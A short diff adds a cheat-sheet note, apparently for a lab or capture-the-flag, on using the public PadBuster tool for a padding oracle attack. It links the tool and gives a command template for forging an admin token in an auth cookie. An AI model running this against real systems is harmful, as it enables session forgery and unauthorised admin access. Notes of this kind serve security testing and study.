@@ -1,0 +1,4 @@
+Oracle padbuster:
+- download perl script from https://github.com/GDSSecurity/PadBuster
+- 'perl padbuster.pl' for usage
+- 'perl padbuster.pl <url> <target-token> 8 -cookies auth=<target=token> -plaintext user=admin' for bruteforce of admin token
